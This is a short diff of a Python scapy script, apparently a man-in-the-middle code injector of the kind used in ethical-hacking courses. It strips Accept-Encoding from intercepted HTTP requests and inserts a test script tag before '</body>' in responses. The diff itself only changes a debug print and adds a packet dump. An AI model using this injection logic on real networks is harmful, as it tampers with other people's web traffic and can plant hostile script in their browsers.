@@ -23,7 +23,8 @@ def process_packet(packet):
             load = re.sub(
                 'Accept-Encoding:.*?\\n\\n', '', str(load))
         elif scapy_packet[scapy.TCP].sport == 80:
-            print('[+] Request')
+            print('[+] Response')
+            print(scapy_packet.show())
             load = load.replace(
                 '</body>', '<script>alert("test");</script></body>')
         if load != packet[scapy.Raw].load:
